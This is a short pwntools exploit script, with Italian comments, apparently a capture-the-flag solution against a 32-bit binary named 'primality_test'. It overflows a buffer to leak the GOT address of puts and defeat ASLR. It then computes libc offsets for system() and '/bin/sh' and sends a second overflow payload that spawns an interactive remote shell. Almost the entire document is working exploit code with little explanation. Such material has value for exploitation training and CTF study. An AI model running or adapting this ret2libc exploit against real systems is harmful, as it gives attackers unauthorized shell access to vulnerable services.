"""
===========================================================================
🎯 Objective: Interactive Shell via Libc Manipulation
💣 Vulnerability: Unbounded Buffer Overflow + Missing PIE
⚔️ Method:
  1. Stage 1: Overwrites EIP to call puts@plt, leaking the real GOT address of puts to defeat ASLR.
  2. Returns execution to main() to prevent the program from crashing.
  3. Calculates the runtime base address of libc and the exact offset of system() and "/bin/sh".
  4. Stage 2: Triggers the overflow again to execute system('/bin/sh').
===========================================================================
"""

from pwn import *

# Carichiamo il file per estrarre gli indirizzi statici
elf = ELF('./primality_test')

r = remote(xxxxx)

offset = 80

#leak dell'indirizzo
print("[*] Fase 1: Estrazione indirizzo reale di puts...")

# Indirizzi statici dal binario (No PIE = sicuri)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x804872d

# Payload 1: [Padding] + [puts@plt] + [main] + [puts@got]
# Nota: mettiamo 'main' come return address di puts per far ripartire il programma
payload1 = b"A" * offset
payload1 += p32(puts_plt)
payload1 += p32(main_addr)
payload1 += p32(puts_got)

r.sendlineafter(b"number: ", payload1)

# Puts ci risponde con i byte dell'indirizzo reale (4 byte su 32-bit)
# Dobbiamo pulire l'output se c'è altro testo
r.recvuntil(b"!\n") 
leak = u32(r.recv(4))
print(f"[+] Leak ricevuto! Indirizzo reale di puts: {hex(leak)}")

libc_base = leak - 0x67360 
addr_system = libc_base + 0x3cd10 
addr_bin_sh = libc_base + 0x17b8cf 

print(f"[*] Libc Base: {hex(libc_base)}")
print(f"[*] System calcolata: {hex(addr_system)}")

# Payload 2:
print("[*] Fase 2: Invio payload system('/bin/sh')...")

payload2 = b"A" * offset
payload2 += p32(addr_system)
payload2 += p32(0xdeadbeef) # Return address fasullo
payload2 += p32(addr_bin_sh)

r.sendline(payload2)
r.interactive()
